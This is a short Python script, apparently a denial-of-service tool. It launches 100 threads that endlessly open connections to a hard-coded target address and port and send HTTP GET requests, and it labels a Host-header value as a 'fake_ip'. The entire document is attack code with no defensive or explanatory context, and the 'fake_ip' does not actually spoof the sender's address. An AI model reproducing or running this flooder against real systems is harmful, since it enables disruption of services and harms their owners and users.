import socket
import threading

target = '192.168.0.108'
fake_ip = '182.21.20.32'
port = 5000



def attack():
    sent = 0
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))

        sent += 1

        print(sent)

        s.close()

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()